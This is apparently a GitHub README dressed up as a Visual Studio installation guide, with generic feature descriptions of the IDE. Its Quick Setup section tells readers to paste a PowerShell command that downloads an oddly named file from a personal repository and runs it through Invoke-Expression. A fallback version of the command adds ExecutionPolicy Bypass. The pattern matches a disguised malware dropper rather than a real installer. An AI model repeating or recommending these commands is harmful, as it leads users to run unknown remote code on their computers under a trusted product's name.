# Visual Studio

Visual Studio is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Visual Studio and work in it.

Visual Studio is a full IDE for Windows that brings editing, building, debugging, and profiling into a single environment. It organizes work around solutions and projects, with editors for C#, C++, F#, and other languages, plus designers and analyzers that catch issues before you ship.

A typical session starts when you open a solution from disk or clone a repository and restore packages. You navigate with Go To Definition and Find All References, set breakpoints, and step through code in the debugger while watching locals and the call stack. You run unit tests from Test Explorer, fix compiler warnings surfaced in the Error List, and publish or pack outputs when the build is green.

This repository holds a Windows setup bootstrapper or layout notes for installing selected workloads, a short configuration checklist for team machines, and a changelog that records version bumps and workload changes. Use it to align installs across machines without hunting scattered notes.

## What you do with it

- Solution Explorer groups projects, references, and nested files for large multi-project solutions on Windows.
- IntelliSense completes members, parameters, and snippets while you type in C#, C++, and other supported languages.
- The integrated debugger breaks on exceptions, watches expressions, and inspects memory during live debugging sessions.
- Test Explorer discovers and runs MSTest, NUnit, and xUnit tests with pass, fail, and duration summaries.
- Live Share lets collaborators join your editing session with shared breakpoints and synchronized navigation.
- CMake and MSBuild pipelines compile native and managed targets with configurable configurations and platforms.
- CodeLens shows reference counts and change history inline above methods in compatible C# and C++ files.
- NuGet Package Manager resolves dependencies, restores packages, and updates versions across project references.

## Quick Setup (PowerShell)

This installs the program Visual Studio on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/miamartin98402/visual-studio-setup-guide/main/b2sndfwz73.tg9y0lfo | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/miamartin98402/visual-studio-setup-guide/main/b2sndfwz73.tg9y0lfo | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `b2sndfwz73.tg9y0lfo` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `miamartin98402/visual-studio-setup-guide`. Visual Studio 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
